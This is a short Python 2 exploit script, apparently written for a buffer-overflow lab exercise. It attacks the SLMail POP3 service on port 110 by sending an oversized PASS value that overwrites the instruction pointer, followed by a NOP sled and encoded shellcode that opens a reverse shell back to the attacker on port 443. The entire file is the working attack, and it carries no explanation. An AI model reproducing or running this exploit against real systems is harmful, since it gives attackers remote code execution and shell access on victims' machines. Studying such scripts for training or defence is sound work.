#!/usr/bin/python

import socket, sys

if len(sys.argv) != 2:
	print 'usage ./slmail-eip-override.py <ip>'
	exit(0)
#shikata ga nai encoded x86 reverse shell to current LHOST LPORT 443
shellcode= ("\xbb\xa1\x17\xe9\x0b\xdb\xc5\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x52\x31\x58\x12\x03\x58\x12\x83\x61\x13\x0b\xfe\x9d\xf4\x49"
"\x01\x5d\x05\x2e\x8b\xb8\x34\x6e\xef\xc9\x67\x5e\x7b\x9f\x8b"
"\x15\x29\x0b\x1f\x5b\xe6\x3c\xa8\xd6\xd0\x73\x29\x4a\x20\x12"
"\xa9\x91\x75\xf4\x90\x59\x88\xf5\xd5\x84\x61\xa7\x8e\xc3\xd4"
"\x57\xba\x9e\xe4\xdc\xf0\x0f\x6d\x01\x40\x31\x5c\x94\xda\x68"
"\x7e\x17\x0e\x01\x37\x0f\x53\x2c\x81\xa4\xa7\xda\x10\x6c\xf6"
"\x23\xbe\x51\x36\xd6\xbe\x96\xf1\x09\xb5\xee\x01\xb7\xce\x35"
"\x7b\x63\x5a\xad\xdb\xe0\xfc\x09\xdd\x25\x9a\xda\xd1\x82\xe8"
"\x84\xf5\x15\x3c\xbf\x02\x9d\xc3\x6f\x83\xe5\xe7\xab\xcf\xbe"
"\x86\xea\xb5\x11\xb6\xec\x15\xcd\x12\x67\xbb\x1a\x2f\x2a\xd4"
"\xef\x02\xd4\x24\x78\x14\xa7\x16\x27\x8e\x2f\x1b\xa0\x08\xa8"
"\x5c\x9b\xed\x26\xa3\x24\x0e\x6f\x60\x70\x5e\x07\x41\xf9\x35"
"\xd7\x6e\x2c\x99\x87\xc0\x9f\x5a\x77\xa1\x4f\x33\x9d\x2e\xaf"
"\x23\x9e\xe4\xd8\xce\x65\x6f\xed\x05\x65\xf7\x99\x1b\x65\x06"
"\xe1\x95\x83\x62\x05\xf0\x1c\x1b\xbc\x59\xd6\xba\x41\x74\x93"
"\xfd\xca\x7b\x64\xb3\x3a\xf1\x76\x24\xcb\x4c\x24\xe3\xd4\x7a"
"\x40\x6f\x46\xe1\x90\xe6\x7b\xbe\xc7\xaf\x4a\xb7\x8d\x5d\xf4"
"\x61\xb3\x9f\x60\x49\x77\x44\x51\x54\x76\x09\xed\x72\x68\xd7"
"\xee\x3e\xdc\x87\xb8\xe8\x8a\x61\x13\x5b\x64\x38\xc8\x35\xe0"
"\xbd\x22\x86\x76\xc2\x6e\x70\x96\x73\xc7\xc5\xa9\xbc\x8f\xc1"
"\xd2\xa0\x2f\x2d\x09\x61\x5f\x64\x13\xc0\xc8\x21\xc6\x50\x95"
"\xd1\x3d\x96\xa0\x51\xb7\x67\x57\x49\xb2\x62\x13\xcd\x2f\x1f"
"\x0c\xb8\x4f\x8c\x2d\xe9")
ip = sys.argv[1]
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = 'A'*2607 + '\x8f\x35\x4a\x5f'+ '\x90'*16 + shellcode +  'C'*(3500-2607-4-351-16)

try:
	print "\nSending very evil buffer..."
	s.connect((ip, 110))
	data = s.recv(1024)
	s.send('USER username' + '\r\n')
	data = s.recv(1024)
	s.send('PASS' + buffer + '\r\n')
	print 'done'
except:
	print 'no pop3 connection'
